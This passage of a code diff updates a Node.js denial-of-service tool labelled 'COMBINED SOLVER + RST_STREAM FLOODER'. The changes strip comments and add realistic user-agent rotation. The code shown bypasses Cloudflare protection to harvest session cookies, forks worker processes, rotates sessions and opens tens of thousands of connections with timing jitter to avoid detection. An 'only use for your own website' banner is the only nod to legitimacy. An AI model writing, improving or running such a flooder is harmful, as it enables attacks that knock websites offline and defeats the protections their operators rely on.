                 if (err) { tlsSocket.destroy(); return; }
-                // Jitter 5-30ms supaya pola tidak konstan
                 const jitter = 5 + Math.floor(Math.random() * 25);
                 setTimeout(() => main(), (1000 / ratelimit) + jitter);
             });
@@ -860,14 +1007,12 @@ setInterval(() => {
 (async () => {
     if (cluster.isMaster) {
         console.clear();
-        console.log("\x1b[35mCOMBINED SOLVER + RST_STREAM FLOODER v1.1\x1b[0m");
+        console.log("\x1b[35mCOMBINED SOLVER + RST_STREAM FLOODER v1.3\x1b[0m");
         console.log("\x1b[33mONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");
 
-        // 1) Run solver di master
         const sessions = await bypassCloudflareParallel(cookieCount);
         sessions.forEach((s, i) => printSessionDetails(s, i));
 
-        // 2) Simpan semua session ke file temp supaya worker bisa rotate
         const sessionFile = `./.sessions_${Date.now()}.json`;
         const sessionsForWorkers = sessions.map(s => ({
             userAgent: s.userAgent,
@@ -884,7 +1029,6 @@ setInterval(() => {
         console.log(`\x1b[36mSample UA:\x1b[0m ${sessionsForWorkers[0].userAgent}`);
         console.log(`\x1b[36mSample Cookie:\x1b[0m ${sessionsForWorkers[0].cookieString.substring(0, 120)}...\n`);
 
-        // 3) Fork workers dengan env berisi session file
         for (let i = 0; i < threads; i++) {
             cluster.fork({
                 SESSION_FILE: sessionFile,
@@ -932,7 +1076,6 @@ setInterval(() => {
         }, time * 1000);
 
     } else {
-        // === Worker: load semua session dari file ===
         let ALL_SESSIONS = [];
         try {
             const raw = fs.readFileSync(process.env.SESSION_FILE, 'utf8');
@@ -940,12 +1083,11 @@ setInterval(() => {
             if (!Array.isArray(ALL_SESSIONS) || ALL_SESSIONS.length === 0) throw new Error("empty");
         } catch (e) {
             ALL_SESSIONS = [{
-                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+                userAgent: pickRealUA(),
                 cookieString: ""
             }];
         }
 
-        // Pick session acak
         function pickSession() {
             const s = ALL_SESSIONS[Math.floor(Math.random() * ALL_SESSIONS.length)];
             session = { userAgent: s.userAgent || session.userAgent };
@@ -958,7 +1100,6 @@ setInterval(() => {
         let someee = setInterval(() => {
             if (consssas < 30000) consssas++;
             else { clearInterval(someee); return; }
-            // Rotasi session tiap koneksi baru
             pickSession();
             try { go(); } catch (e) {}
         }, delay > 0 ? delay : 5);
